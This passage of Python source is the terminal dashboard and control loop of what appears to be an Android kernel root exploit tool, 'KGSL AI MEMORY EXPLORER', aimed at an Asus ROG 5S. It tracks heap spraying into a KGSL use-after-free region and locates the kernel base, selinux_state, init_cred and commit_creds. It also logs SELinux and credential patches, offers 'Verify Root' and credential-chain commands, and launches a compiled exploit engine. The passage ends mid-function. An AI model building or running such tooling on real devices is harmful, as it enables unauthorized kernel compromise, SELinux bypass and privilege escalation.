        if "task_struct" in desc or b"KETO" in data:
            try:
                pid = struct.unpack("<I", data[self.offsets["pid"]:self.offsets["pid"]+4])[0]
                comm = data[self.offsets["comm"]:self.offsets["comm"]+16].split(b"\x00")[0].decode(errors='ignore')
            except Exception:
                pid, comm = 0, "unknown"
            return f"Process Descriptor for '{comm}' (PID {pid})"
        if "SELinux" in desc:
            return "Global SELinux configuration bit."
        if "Settings" in desc:
            return "Android Settings process memory."
        if "CRED" in desc:
            return "Credential structure. Holds UID/GID. Target for Root."
        return "Generic data buffer."

    # ============== LIVE UPDATER ==============
    def _live_updater(self):
        last_spray_count = 0
        last_t = time.time()
        while not self._stop_live.is_set():
            now = time.time()
            self.live["ram"] = self.get_ram_usage()
            self.live["ai_patterns"] = self.knowledge_base.get("hit_count", 0)

            # Status reflects engine + per-op busy state
            if self.autopilot_mode and self.autopilot_thread and self.autopilot_thread.is_alive():
                if self.autopilot_paused:
                    self.live["status"] = "AUTOPILOT ⏸"
                else:
                    self.live["status"] = "AUTOPILOT"
            elif self.op_busy.get("exploit"):
                self.live["status"] = "EXPLOITING…"
            elif self.op_busy.get("scan"):
                self.live["status"] = "SCANNING…"
            elif self.exploit_proc and self.exploit_proc.poll() is None:
                self.live["status"] = "EXPLOIT ACTIVE"
                self.live["engine_pid"] = self.exploit_proc.pid
            else:
                self.live["status"] = "IDLE"
                self.live["engine_pid"] = 0

            # Particle index for animation
            self.live["particle_idx"] = (self.live["particle_idx"] + 1) % len(PARTICLES)
            # Spray pulse: rate of sprays per second
            if self.live["spray_count"] != last_spray_count:
                dt = max(0.001, now - last_t)
                self.live["sprays_per_sec"] = (self.live["spray_count"] - last_spray_count) / dt
                last_spray_count = self.live["spray_count"]
                self.live["last_spray_ts"] = now
                self.live["spray_pulse"] = (self.live["spray_pulse"] + 1) % len(SPRAY_PARTICLES)
                last_t = now

            time.sleep(0.2)

    # ============== AUTO RENDERER ==============
    # NOTE: The actual render thread is _render_loop() / _start_render_thread()
    # defined near the top of the class (around line 729). It is the
    # SOLE render thread. We do NOT start the older _auto_renderer()
    # here anymore — that one was conflicting with the new one and
    # causing deadlocks on the render_lock.
    # The _live_updater() below ONLY updates the live{} dict; the
    # render thread is what paints the screen.

    # ============== TUI ==============
    # All TUI writes go through sys.stdout.write + flush. We use
    # ONE thread (the main thread) for both input and rendering,
    # so no locks are needed. select() in input_cmd() drives the
    # auto-redraw at ~3 Hz (every 0.3s of no keypress).
    def render_tui(self, hint=""):
        """Public entry point. Build the TUI with the prompt included
        and write it atomically. Delegates to _render_tui_body for
        the body lines and appends the prompt on its own line.
        """
        # v4.1: update throughput history at 1Hz (no-op if not yet
        # 1s since last update)
        self._update_throughput()
        if not self.render_lock.acquire(blocking=False):
            return
        try:
            sys.stdout.write("\033[?25l")  # hide cursor
            sys.stdout.write(C.CLR)          # clear + home
            self._render_tui_body(hint=hint)
            # Trailing prompt line. End with \r\n so the cursor
            # drops to a fresh line below the prompt.
            sys.stdout.write(f"\r\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} ")
            sys.stdout.flush()
            sys.stdout.write("\033[?25h")   # show cursor
            sys.stdout.flush()
        except Exception:
            pass
        finally:
            try:
                sys.stdout.write("\033[?25h")
                sys.stdout.flush()
            except Exception:
                pass
            self.render_lock.release()

    def _bar(self, pct, width, color):
        filled = int(width * pct / 100)
        return f"{C.GRY}[{color}{'█' * filled}{'░' * (width - filled)}{C.GRY}]{C.RST}"

    # ============== INPUT + AUTO-REDRAW (single-thread, Termux-safe) ==============
    # Canonical TUI pattern for Termux/Android:
    #   - ONE thread (the main thread) owns ALL stdout writes.
    #   - `select()` with a short timeout (0.3s) lets the loop
    #     auto-redraw the TUI when no key is pressed. So the user
    #     sees live updates (RAM, AI, spray, scan, particles)
    #     without pressing anything.
    #   - `tty.setcbreak` (NOT setraw): char-by-char input but
    #     OPOST stays ON so \n → \r\n translation still works
    #     (with setraw, every TUI redraw becomes a "staircase"
    #     of indented lines and you only see the first frame).
    #   - `sys.stdout.write` + `flush` (no `print`, no `os.write`,
    #     no second thread) — the most portable and reliable path
    #     on every Termux build.
    def input_cmd(self):
        self.is_reading_input = True
        try:
            # Initial TUI render so the user sees the dashboard on
            # the very first input prompt. Without this they'd only
            # see "explorer >" with a blank screen above.
            try:
                self._tui_full_redraw_with_input("")
            except Exception:
                pass
            self._print_prompt("")
            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            try:
                tty.setcbreak(fd)
                buf = []
                hist_idx = len(self.cmd_history)
                last_redraw = 0.0
                REDRAW_EVERY = 0.3  # seconds
                while True:
                    r, _, _ = select.select([fd], [], [], REDRAW_EVERY)
                    now = time.time()
                    if not r:
                        # No key pressed in the timeout window →
                        # auto-redraw the WHOLE TUI so live values
                        # update online without user input.
                        if now - last_redraw >= REDRAW_EVERY:
                            self._tui_full_redraw_with_input("".join(buf))
                            last_redraw = now
                        continue
                    ch = os.read(fd, 1)
                    if not ch:
                        break
                    c = ch.decode("utf-8", errors="ignore")
                    if c == "\x03":  # Ctrl+C
                        buf = ["q"]
                        break
                    if c == "\x10":  # Ctrl+P  -> cancel learning
                        self.cmd_learning_cancel()
                        self.live["last_msg"] = "Press 'L' to start a new learning cycle."
                        self._print_prompt("".join(buf), extra="\n [Ctrl+P] Learning cancelled.\n")
                        continue
                    if c in ("\r", "\n"):
                        sys.stdout.write("\r\n")
                        sys.stdout.flush()
                        break
                    if c == "\x7f" or c == "\b":
                        if buf:
                            buf.pop()
                            sys.stdout.write("\b \b")
                            sys.stdout.flush()
                        continue
                    if c == "\x05":  # Ctrl+E -> rewind to last command
                        if self.last_cmd_text:
                            self._print_prompt(self.last_cmd_text)
                            buf = list(self.last_cmd_text)
                        continue
                    if c == "\x1b":  # ESC sequence (arrow keys)
                        nxt = os.read(fd, 2)
                        if nxt == b"[A":  # Up arrow
                            if self.cmd_history and hist_idx > 0:
                                hist_idx -= 1
                                self._print_prompt(self.cmd_history[hist_idx])
                                buf = list(self.cmd_history[hist_idx])
                        elif nxt == b"[B":  # Down arrow
                            if self.cmd_history and hist_idx < len(self.cmd_history) - 1:
                                hist_idx += 1
                                self._print_prompt(self.cmd_history[hist_idx])
                                buf = list(self.cmd_history[hist_idx])
                            else:
                                hist_idx = len(self.cmd_history)
                                self._print_prompt("")
                                buf = []
                        continue
                    buf.append(c)
                    sys.stdout.write(c)
                    sys.stdout.flush()
                    # Any keypress also triggers a redraw so the
                    # TUI stays fresh even when the user is typing
                    # quickly (otherwise 0.3s of burst typing could
                    # miss the auto-redraw window).
                    if now - last_redraw >= REDRAW_EVERY:
                        self._tui_full_redraw_with_input("".join(buf))
                        last_redraw = now
            finally:
                try:
                    termios.tcsetattr(fd, termios.TCSADRAIN, old)
                except Exception:
                    pass
            cmd = "".join(buf).strip()
            if cmd:
                self.cmd_history.append(cmd)
                if len(self.cmd_history) > 100:
                    self.cmd_history = self.cmd_history[-100:]
                self.last_cmd_text = cmd
            return cmd
        finally:
            self.is_reading_input = False

    def _print_prompt(self, buf, extra=""):
        """Print the prompt + buffer on the current line.
        NO trailing \\n — the user types on the same line. This is
        critical for Termux: if we put \\n at the end, the cursor
        drops to the next line and the user's chars end up on a
        line that gets cleared on the next TUI redraw.
        """
        # \r = go to col 0; \033[2K = clear entire line.
        # Then the prompt + buffer. No \n after — the user
        # types after the buffer, on the same line.
        line = f"\r\033[2K{extra} {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} {buf}"
        sys.stdout.write(line)
        sys.stdout.flush()

    def _tui_full_redraw_with_input(self, input_buf):
        """Atomically redraw the whole TUI while preserving the
        user's input line at the bottom. Called from input_cmd()
        every 0.3s of no-keypress so the user sees live updates
        without pressing anything.
        """
        if not self.render_lock.acquire(blocking=False):
            return  # another render in progress; skip this frame
        try:
            # Hide cursor during redraw to avoid flicker
            sys.stdout.write("\033[?25l")
            sys.stdout.write(C.CLR)         # clear screen + home
            try:
                self._render_tui_body()    # build & write body lines
            except Exception:
                pass
            # Re-emit the prompt + buffer at the bottom (same line)
            self._print_prompt(input_buf)
            # Re-show cursor
            sys.stdout.write("\033[?25h")
            sys.stdout.flush()
        except Exception:
            pass
        finally:
            try:
                sys.stdout.write("\033[?25h")
                sys.stdout.flush()
            except Exception:
                pass
            self.render_lock.release()

    def _render_tui_body(self, hint=""):
        """Build the TUI lines (everything EXCEPT the prompt at the
        bottom) and write them to stdout with explicit \\r\\n
        endings. NO trailing \\r\\n — the caller adds the prompt
        on the same line as the cursor.
        """
        out = []
        L = self.live
        if "particle_idx" not in L:
            L["particle_idx"] = 0
        if "spray_pulse" not in L:
            L["spray_pulse"] = 0
        L["particle_idx"] += 1
        L["spray_pulse"]   = L["particle_idx"] // 2
        pi = L["particle_idx"] % len(PARTICLES)
        sp = L["spray_pulse"] % len(SPRAY_PARTICLES)
        particle = PARTICLES[pi]
        spray_p  = SPRAY_PARTICLES[sp]
        up = int(time.time() - L["uptime_start"])
        m, s = divmod(up, 60)
        h, m = divmod(m, 60)

        # Watchdog counter — shows how many times the watchdog
        # restarted something. If the user sees "restarts=N" growing,
        # the workers are crashing repeatedly and the auto-restart is
        # saving them.
        wd = L.get("watchdog_restarts") or {}
        wd_total = sum(wd.values()) if isinstance(wd, dict) else 0
        wd_str = f" WD={C.YEL}{wd_total}{C.RST}" if wd_total > 0 else ""

        out.append(f"{C.BG_BLK}{C.CYN}{C.BOLD} {particle} KGSL AI MEMORY EXPLORER  v4.1 Q-LEARN{C.RST}"
                   f"{C.GRY} │ {C.WHT}Asus ROG 5S  {C.GRY}│{C.RST}"
                   f" Up {C.GRN}{h:02d}:{m:02d}:{s:02d}{C.RST}  {C.GRY}│{C.RST}  "
                   f"{C.MAG}{spray_p}{C.RST}  {C.GRY}│{C.RST}"
                   f" {C.GRN}AUTO{C.RST}{wd_str}")

        ram_color = C.GRN if L["ram"] < 50 else (C.YEL if L["ram"] < 75 else C.RED)
        st_color  = C.GRN if "ACTIVE" in L["status"] else C.GRY
        out.append(f" {C.BOLD}STATUS{C.RST}: {st_color}{L['status']:<14}{C.RST}"
                   f" {C.GRY}│{C.RST} {C.BOLD}RAM{C.RST}: {ram_color}{L['ram']:5.1f}%{C.RST}"
                   f" {C.GRY}│{C.RST} {C.BOLD}AI LEARNING{C.RST}: {C.MAG}{L['ai_patterns']:>4}{C.RST} patterns"
                   f" {C.GRY}│{C.RST} {C.BOLD}ENGINE{C.RST}: {C.CYN}{L['engine_pid']:>6}{C.RST}"
                   f" {C.GRY}│{C.RST} {C.BOLD}SPRAY/s{C.RST}: {C.YEL}{L['sprays_per_sec']:5.1f}{C.RST}")

        out.append(f" {C.BOLD}LAST MSG{C.RST}: {C.YEL}{L['last_msg'][:70]}{C.RST}")

        # === v4.1: PERF COUNTERS ===
        # Show real throughput (pages scanned, MB read, peaks)
        # not just counters. The user can see if the engine is
        # actually reading pages at full speed or stuck.
        perf = self.perf
        mb_read = perf.get("bytes_read", 0) / (1024 * 1024)
        out.append(
            f" {C.BOLD}PERF{C.RST}: "
            f"pages={C.CYN}{perf.get('pages_scanned', 0)}{C.RST} "
            f"MB={C.CYN}{mb_read:.1f}{C.RST} "
            f"sprayP={C.CYN}{perf.get('spray_attempts', 0)}{C.RST} "
            f"alivePeak={C.YEL}{perf.get('spray_alive_peak', 0)}{C.RST} "
            f"scans={C.CYN}{perf.get('scans_completed', 0)}{C.RST} "
            f"errScans={C.RED}{perf.get('scans_failed', 0)}{C.RST}")

        # === v4.1: SPRAY METHODS STATS ===
        # Side-by-side: which spray method is working?
        sms = self.spray_methods_stats
        m_parts = []
        for mn, st in sms.items():
            if st.get("attempts", 0) > 0:
                alive_pct = 100.0 * st.get("alive", 0) / st["attempts"]
                m_parts.append(f"{mn}:{st['attempts']}({alive_pct:.0f}%a)")
        if m_parts:
            out.append(f" {C.BOLD}METHODS{C.RST}: " +
                       f"{C.GRY}{' '.join(m_parts)}{C.RST}")

        # === v4.1: CONFIDENCE HISTOGRAM ===
        # Bar chart of confidence distribution
        if sum(self.conf_histogram) > 0:
            hist = self.conf_histogram
            total = sum(hist)
            out.append(f" {C.BOLD}CONF{C.RST}: ")
            for i, count in enumerate(hist):
                if count > 0:
                    lo = i * 10
                    hi = lo + 9 if i < 10 else 100
                    pct = 100.0 * count / total
                    bar_len = int(pct / 5)  # 1 char per 5%
                    bar = "█" * bar_len
                    col = C.RED if i < 3 else (C.YEL if i < 6 else C.GRN)
                    out.append(f"   {col}{lo:3d}-{hi:3d}:{C.RST} "
                               f"{col}{bar}{C.RST} {count} ({pct:.0f}%)")

        # === v4.1: THROUGHPUT SPARKLINE ===
        # Render the last 60 seconds of pages/sec as ASCII bars
        spark_chars = " ▁▂▃▄▅▆▇█"
        th = self.throughput_history
        if any(th):
            max_th = max(th) or 1.0
            bars = "".join(spark_chars[min(8, int((v / max_th) * 8))]
                           for v in th)
            avg_th = sum(th) / len([v for v in th if v > 0] or [1])
            m_per_hour = self.perf.get("matches_per_hour", 0)
            out.append(f" {C.BOLD}THRPT{C.RST}  "
                       f"peak={C.YEL}{max_th:.1f}{C.RST}pg/s "
                       f"avg={C.CYN}{avg_th:.1f}{C.RST}pg/s "
                       f"m/h={C.GRN}{m_per_hour}{C.RST}  "
                       f"{C.BLU}{bars}{C.RST}")

        # === v4.1: Q-TABLE TOP ACTIONS ===
        # Show the best Q values for the current state so user
        # sees what the AI is "thinking"
        if self.q_table:
            cur_state = (
                min(9, self._adaptive_scan.get("no_match_batches", 0)),
                int(self.live.get("kill_count", 0)
                    / max(1, self.live.get("spray_count", 0)) * 10),
            )
            cur_q = self.q_table.get(cur_state)
            if cur_q:
                top3 = sorted(cur_q.items(), key=lambda kv: -kv[1])[:3]
                top_str = " ".join(f"{a[0]}={a[1]}({v:.1f})"
                                   for a, v in top3)
                out.append(f" {C.BOLD}Q-LEARN{C.RST} (state={cur_state}): "
                           f"{C.MAG}{top_str}{C.RST}")

        if L["scan_total"] > 0 or L["spray_target"] > 0:
            if L["spray_target"] > 0:
                pct = min(100, 100 * L["spray_count"] // max(1, L["spray_target"]))
                bar = self._bar(pct, 32, C.CYN)
                # Show kills ratio prominently. If >80% kills, paint
                # red — that's the symptom of spray procs not
                # surviving long enough to land in KGSL.
                total_sprayed = max(1, L["spray_count"])
                kill_ratio = 100.0 * L["kill_count"] / total_sprayed
                kill_col = (C.RED if kill_ratio > 80 else
                            C.YEL if kill_ratio > 50 else C.GRY)
                out.append(f" {C.BOLD}SPRAY {C.RST}{spray_p} {bar} {pct:3d}%  "
                           f"({L['spray_count']}/{L['spray_target']})  "
                           f"kills:{kill_col}{L['kill_count']}{C.RST}({kill_ratio:.0f}%)")
            if L["scan_total"] > 0:
                pct = min(100, 100 * L["scan_offset"] // max(1, L["scan_total"]))
                bar = self._bar(pct, 32, C.YEL)
                out.append(f" {C.BOLD}SCAN  {C.RST}  {bar} {pct:3d}%  "
                           f"({L['scan_offset']:#x}/{L['scan_total']:#x})")

        # AI Stats — short roll-up of the learning state. The
        # current cycle's stats are in self.learn_stats; if missing
        # (e.g. learning not started), we show zeros.
        ls = getattr(self, 'learn_stats', None) or {}
        n_matches  = ls.get('matches', 0)
        n_verified = ls.get('verified', 0)
        n_fp       = ls.get('false_positives', 0)
        n_sprayed  = ls.get('sprayed_total', 0)
        n_batches  = ls.get('batches', 0)
        n_kbase    = 1 if self.kernel_base else 0
        n_selinux  = 1 if self.selinux_va else 0
        n_cred     = 1 if self.cred_va else 0
        # Per-type counts in found_items
        type_counts = {}
        for it in self.found_items:
            t = it.get('type', '?')
            type_counts[t] = type_counts.get(t, 0) + 1
        # Top 4 most common types
        top = sorted(type_counts.items(), key=lambda kv: -kv[1])[:4]
        types_line = " · ".join(f"{t}={n}" for t, n in top) if top else "none"
        # Hit rate (verified / matches) — quality indicator
        if n_matches > 0:
            hit_rate = 100.0 * n_verified / n_matches
            hr_color = C.GRN if hit_rate > 50 else (C.YEL if hit_rate > 20 else C.RED)
        else:
            hit_rate = 0.0
            hr_color = C.GRY
        out.append(f" {C.BOLD}AI{C.RST}: "
                   f"batches={C.CYN}{n_batches}{C.RST} "
                   f"sprayed={C.CYN}{n_sprayed}{C.RST} "
                   f"xattr={C.MAG}{ls.get('xattrs_set', 0)}{C.RST} "
                   f"matches={C.YEL}{n_matches}{C.RST} "
                   f"verified={C.GRN}{n_verified}{C.RST} "
                   f"falsePos={C.RED}{n_fp}{C.RST} "
                   f"hitRate={hr_color}{hit_rate:4.1f}%{C.RST}")

        # Per-Worker status — show each of the 3 subworkers
        # independently so the user can see at a glance whether all
        # three are alive (and their individual spray counts). Before
        # this, the TUI just showed "1/3 workers" as a single number
        # and there was no way to tell which worker had died.
        if self._learn_subworkers or self.w3_enabled:
            worker_parts = []
            for wid in range(LEARN_WORKERS):
                t = self._learn_subworkers[wid] if wid < len(self._learn_subworkers) else None
                alive = t is not None and t.is_alive()
                pids  = self.spray_procs_by_worker.get(wid, set())
                state = f"{C.GRN}●{C.RST}" if alive else f"{C.RED}●{C.RST}"
                worker_parts.append(
                    f"W{wid}{state}{len(pids)}")
            # W3 deep-scan worker (4th worker, no spray, just
            # re-scans Empty Page locations to see if anything
            # appeared there since the original scan).
            w3_alive = (self.w3_thread
                        and self.w3_thread.is_alive()
                        and self.w3_enabled)
            w3_state = f"{C.GRN}●{C.RST}" if w3_alive else f"{C.GRY}○{C.RST}"
            worker_parts.append(f"W3{w3_state}D")
            out.append(f" {C.BOLD}WORKERS{C.RST}: "
                   f"{' '.join(worker_parts)}  "
                   f"{C.GRY}(●=alive n=spray procs, W3=deep-scan){C.RST}  "
                   f"{C.GRY}adapt={self._adaptive_scan.get('offset_idx', 0)}"
                   f"/{self._adaptive_scan.get('no_match_batches', 0)}nm{C.RST}")
        # kbase coloring — use a different color when we don't know it
        # yet so the user can tell at a glance.
        kbase_s   = f"{self.kernel_base:#x}" if self.kernel_base else "0x??????"
        kbase_col = C.CYN if self.kernel_base else C.GRY
        sel_s     = f"{self.selinux_va:#x}" if self.selinux_va else "0x??????"
        sel_col   = C.RED if self.selinux_va else C.GRY
        cred_s    = f"{self.cred_va:#x}" if self.cred_va else "0x??????"
        cred_col  = C.GRN if self.cred_va else C.GRY
        out.append(f" {C.BOLD}KERNEL{C.RST}: "
                   f"kbase={kbase_col}{kbase_s}{C.RST} "
                   f"selinux={sel_col}{sel_s}{C.RST} "
                   f"init_cred={cred_col}{cred_s}{C.RST}")
        # v4.1: show kallsyms cache if loaded — this proves that
        # the explorer is working even when engine pipe is broken
        # (pages=0, scans=0). The user sees real symbol addresses.
        if self.kallsyms:
            kc = C.MAG
            syms_line = (f"commit_creds={kc}0x"
                         f"{self.kallsyms.get('commit_creds', 0):x}{C.RST} "
                         f"prep_kc={kc}0x"
                         f"{self.kallsyms.get('prepare_kernel_cred', 0):x}{C.RST} "
                         f"init_cred={kc}0x"
                         f"{self.kallsyms.get('init_cred', 0):x}{C.RST} "
                         f"selinux={kc}0x"
                         f"{self.kallsyms.get('selinux_state', 0):x}{C.RST}")
            out.append(f" {C.DIM}SYMS :{C.RST} {syms_line}")
        out.append(f" {C.DIM}found types: {types_line}{C.RST}")

        out.append(f"{C.GRY}{'─'*92}{C.RST}")
        # Memory Map — visual address-space heatmap so the user can
        # see where found items cluster at a glance. We bucket the
        # 64-bit address space into 16 wide regions and count items
        # in each.
        if self.found_items:
            import bisect as _bisect
            # 16 buckets covering 0xffffff80_00000000 .. 0xffffffc0_00000000
            # (the typical AArch64 kernel VA range).
            bucket_edges = [
                0xffffff8000000000, 0xffffff8800000000,
                0xffffff9000000000, 0xffffff9800000000,
                0xffffffa000000000, 0xffffffa800000000,
                0xffffffb000000000, 0xffffffb800000000,
                0xffffffc000000000, 0xffffffc400000000,
                0xffffffc800000000, 0xffffffcc00000000,
                0xffffffd000000000, 0xffffffd800000000,
                0xffffffe000000000, 0xfffffff000000000,
            ]
            bucket_counts = [0] * (len(bucket_edges) + 1)
            bucket_types  = [[] for _ in range(len(bucket_edges) + 1)]
            for it in self.found_items:
                try:
                    v = int(it['va'], 16)
                except Exception:
                    continue
                idx = _bisect.bisect_left(bucket_edges, v)
                bucket_counts[idx] += 1
                t = it.get('type', '?')
                if t not in bucket_types[idx]:
                    bucket_types[idx].append(t)
            # Render only buckets that have items OR that contain
            # kbase/uaf_start. Cap at 8 lines so the TUI doesn't
            # grow unbounded.
            lines_to_show = []
            for i, count in enumerate(bucket_counts):
                if count == 0 and not (
                    (i > 0 and bucket_edges[i-1] == (self.kernel_base & ~0x7FFFFFFFF))
                    if self.kernel_base else False):
                    continue
                lo = bucket_edges[i-1] if i > 0 else 0xffffff8000000000
                hi = bucket_edges[i]   if i < len(bucket_edges) else 0xffffffffffffffff
                bar_len = min(count, 20)
                bar = '█' * bar_len + '░' * (20 - bar_len)
                types_str = ','.join(bucket_types[i][:3]) if bucket_types[i] else ''
                # Mark special addresses
                marker = ""
                if self.kernel_base and lo <= self.kernel_base < hi:
                    marker = " ← kbase"
                elif self.uaf_start and lo <= self.uaf_start < hi:
                    marker = " ← uaf_start"
                elif self.cred_va and lo <= self.cred_va < hi:
                    marker = " ← init_cred"
                lines_to_show.append(
                    f"  {C.GRY}0x{lo:016x}{C.RST} {C.CYN}{bar}{C.RST} {count:3d} {types_str}{marker}")
                if len(lines_to_show) >= 8:
                    break
            if lines_to_show:
                out.append(f" {C.BOLD}{C.MAG}[MEMORY MAP]{C.RST} "
                           f"{C.DIM}(found items, 64-bit kernel VA){C.RST}")
                for ln in lines_to_show:
                    out.append(ln)
                out.append(f"{C.GRY}{'─'*92}{C.RST}")

            # === SPRAY MAP (8x8 grid of UAF address space) ===
            # Each cell represents a 512KB bucket of the UAF range.
            # Color codes (legend below):
            #   ░ = unscanned       (gray)
            #   ▒ = spraying now    (yellow)
            #   █ = spray error     (red)
            #   ▓ = scanning now    (orange)
            #   ◆ = scan error      (dark orange / magenta)
            #   · = done (empty)    (blue/gray)
            #   ★ = FOUND!          (green)
            sm = self.spray_map
            if any(sm):  # only show if there's something
                out.append(f" {C.BOLD}{C.CYN}[SPRAY MAP]{C.RST} "
                           f"{C.DIM}(8×8 grid of 32MB UAF, 512KB/bucket){C.RST}")
                grid_chars = {
                    0: (f"{C.GRY}░",  "unscanned"),
                    1: (f"{C.YEL}▒",  "spraying"),
                    2: (f"{C.RED}█",  "spray err"),
                    3: (f"{C.MAG}▓",  "scanning"),
                    4: (f"{C.RED}◆",  "scan err"),
                    5: (f"{C.BLU}·",  "done-empty"),
                    6: (f"{C.GRN}★",  "FOUND!"),
                }
                # Render as 8 rows of 8 cells, with a VA annotation
                # for the first column of each row.
                for row in range(8):
                    cells = []
                    for col in range(8):
                        bidx = row * 8 + col
                        if bidx < len(sm):
                            ch, _ = grid_chars.get(
                                sm[bidx], (f"{C.GRY}░", "unscanned"))
                            cells.append(ch)
                        else:
                            cells.append(f"{C.GRY}░")
                    # First cell of each row shows the VA offset
                    va_off = row * 8 * self.SPRAY_MAP_BUCKET_SIZE
                    va_str = f"0x{va_off:07x}"
                    out.append(
                        f"   {C.DIM}{va_str}{C.RST}  "
                        f"{''.join(cells)}{C.RST}")
                # Legend
                legend_parts = []
                for code, (ch, name) in grid_chars.items():
                    if any(c == code for c in sm):
                        legend_parts.append(f"{ch}{C.RST}={name}")
                out.append(f"   {C.GRY}legend: "
                           f"{' '.join(legend_parts)}{C.RST}")
                out.append(f"{C.GRY}{'─'*92}{C.RST}")
        out.append(f" {C.BOLD}{C.WHT}[FILE MANAGER VIEW] — Found Memory Offsets  "
                   f"{C.GRY}({len(self.found_items)} total){C.RST}")
        out.append(f"{C.GRY}{'─'*92}{C.RST}")
        if not self.found_items:
            out.append(f" {C.GRY}(No items yet — press {C.WHT}[E]{C.GRY} to exploit, "
                       f"{C.WHT}[L]{C.GRY} to learn, {C.WHT}[S]{C.GRY} to scan){C.RST}")
        else:
            total = len(self.found_items)
            display = self.found_items[-20:]
            # Distribution summary — count types in the full set so
            # the user sees the overall learning progress.
            type_counts = {}
            for it in self.found_items:
                t = it.get('type', '?')
                type_counts[t] = type_counts.get(t, 0) + 1
            top_types = sorted(type_counts.items(),
                               key=lambda kv: -kv[1])[:5]
            if top_types:
                summary = " · ".join(f"{t}={n}" for t, n in top_types)
                out.append(f" {C.DIM}types: {summary}{C.RST}")
            for i, item in enumerate(display):
                idx = total - len(display) + i
                color = {"Kernel Core": C.RED, "Privilege Struct": C.YEL,
                         "System App": C.BLU, "Kernel Code": C.MAG,
                         "SELinux": C.RED, "SELinux (PATCHED)": C.GRN,
                         "Privilege Struct (ROOTED)": C.GRN,
                         "Kernel Global": C.CYN, "Kernel Heap": C.CYN,
                         "Task Struct": C.YEL, "Kernel Strings": C.BLU,
                         "Spray Marker": C.YEL,
                         "Unknown Object": C.GRY}.get(item['type'], C.GRY)
                # Confidence bar — visualize the 0-100 confidence
                # value as a 6-char bar so the user can see at a
                # glance which items are solid hits.
                conf = int(item.get('confidence', 0))
                bar = ('█' * (conf // 20) +
                       '░' * (5 - conf // 20))
                # Description + compact summary
                desc = item['description'][:42]
                # Show a brief data hint if we have it — e.g. comm
                # string or comm for a task_struct.
                data_hint = ""
                if 'data' in item and item['data']:
                    d = item['data']
                    if isinstance(d, (bytes, bytearray)):
                        # Find first printable run of 4+ chars
                        run = b""
                        for b in d:
                            if 0x20 <= b <= 0x7e:
                                run += bytes([b])
                            else:
                                if len(run) >= 4:
                                    break
                                run = b""
                        if len(run) >= 4:
                            data_hint = f" [{run[:14].decode(errors='ignore')}]"
                out.append(
                    f" {C.GRY}└──{C.RST} {C.BOLD}{color}[{idx:02d}]{C.RST} "
                    f"{color}{item['type']:<22}{C.RST} │ "
                    f"{C.WHT}{desc:<42}{C.RST} │ "
                    f"{C.CYN}{item['va']}{C.RST}"
                    f"  {C.GRY}{bar}{C.RST} {conf:>3}%{data_hint}")
            if total > 20:
                out.append(f" {C.DIM}… and {total - 20} more (type 'list' to see all){C.RST}")

        out.append(f"{C.GRY}{'─'*92}{C.RST}")
        out.append(
            f" {C.GRN}[A]{C.RST} AUTOPILOT       "
            f" {C.GRN}[P]{C.RST} Pause           "
            f" {C.GRN}[G]{C.RST} Resume          "
            f" {C.GRN}[X]{C.RST} Stop"
        )
        out.append(
            f" {C.BLU}[R]{C.RST} Verify Root       "
            f" {C.BLU}[B]{C.RST} Rebuild Engine    "
            f" {C.BLU}[Q]{C.RST} Exit Explorer     "
            f" {C.BLU}[ID]{C.RST} Open File"
        )
        out.append(
            f" {C.BLU}[list]{C.RST} Show All Items "
            f" {C.BLU}[kb]{C.RST} Kernel Intel   "
            f" {C.BLU}[log]{C.RST} Spray Log"
        )
        out.append(
            f" {C.BLU}[stats]{C.RST} AI Stats    "
            f" {C.BLU}[save]{C.RST} Export JSON  "
            f" {C.BLU}[dev]{C.RST} Device Info"
        )
        out.append(
            f" {C.BLU}[v<N>]{C.RST} Re-verify    "
            f" {C.BLU}[walk]{C.RST} Cred chain   "
            f" {C.BLU}[w3]{C.RST} Deep-scan"
        )
        out.append(f"{C.GRY}{'─'*92}{C.RST}")

        if self.spray_log:
            out.append(f" {C.BOLD}{C.MAG}LIVE LOG STREAM{C.RST} {C.GRY}(last 3){C.RST}")
            for e in self.spray_log[-3:]:
                et = e.get("type", "?")
                if et == "spray":
                    out.append(f"  {C.CYN}▸{C.RST} SPRAY  pid={C.WHT}{e.get('pid',0):<6}{C.RST} "
                               f"name={C.YEL}{e.get('name','?'):<14}{C.RST} "
                               f"batch={C.GRY}{e.get('batch',0)}{C.RST}")
                elif et == "kill":
                    out.append(f"  {C.RED}✗{C.RST} KILL   pid={C.WHT}{e.get('pid',0)}{C.RST}")
                elif et == "scan_match":
                    out.append(f"  {C.GRN}✓{C.RST} MATCH  va={C.CYN}{hex(e.get('va',0)):<14}{C.RST} "
                               f"type={C.MAG}{e.get('type','?')}{C.RST}")
                elif et == "patch":
                    out.append(f"  {C.YEL}⚡{C.RST} PATCH  va={C.CYN}{e.get('va','?')}{C.RST} "
                               f"val={e.get('val','?')} → {e.get('result','?')}")
            out.append(f"{C.GRY}{'─'*92}{C.RST}")

        if hint:
            out.append(f" {C.MAG}HINT{C.RST}: {C.WHT}{hint}{C.RST}")
        out.append(f" {C.GRY}LAST CMD{C.RST}: {C.CYN}{L['last_command']}{C.RST}    "
                   f"{C.GRY}(↑/↓ history, Ctrl+E rewind, Ctrl+P stop 'L', 'log' to dump){C.RST}")

        # Write with EXPLICIT \r\n between lines (Termux-safe,
        # works whether OPOST is on or off). NO trailing \r\n —
        # the prompt is on the same line as the cursor.
        sys.stdout.write("\r\n".join(out))
        sys.stdout.flush()

    # ============== ENGINE MANAGEMENT ==============
    def ensure_engine(self):
        # engine_lock is RLock, so it's safe to call from inside
        # _engine_write which also holds the lock.
        with self.engine_lock:
            if self.exploit_proc:
                if self.exploit_proc.poll() is None:
                    return True
                else:
                    try:
                        err = self.exploit_proc.stderr.read().decode()
                    except Exception:
                        err = ""
                    self.live["last_msg"] = f"Engine died: {err.strip()[:80]}"
                    self.log_event("engine_died", {"code": self.exploit_proc.returncode, "err": err})
                    self.exploit_proc = None

            # Check format / missing
            if os.path.exists(self.engine_path):
                try:
                    with open(self.engine_path, "rb") as f:
                        head = f.read(4)
                    if head[:4] != b"\x7fELF":
                        self.try_compile_engine()
                except Exception:
                    self.try_compile_engine()
            else:
                self.try_compile_engine()

            try:
                self.exploit_proc = subprocess.Popen(
                    [self.engine_path],
                    stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE, text=False, bufsize=0,
                )
                # Update the live status so the TUI header shows the
                # real engine PID (was staying at 0 after a rebuild).
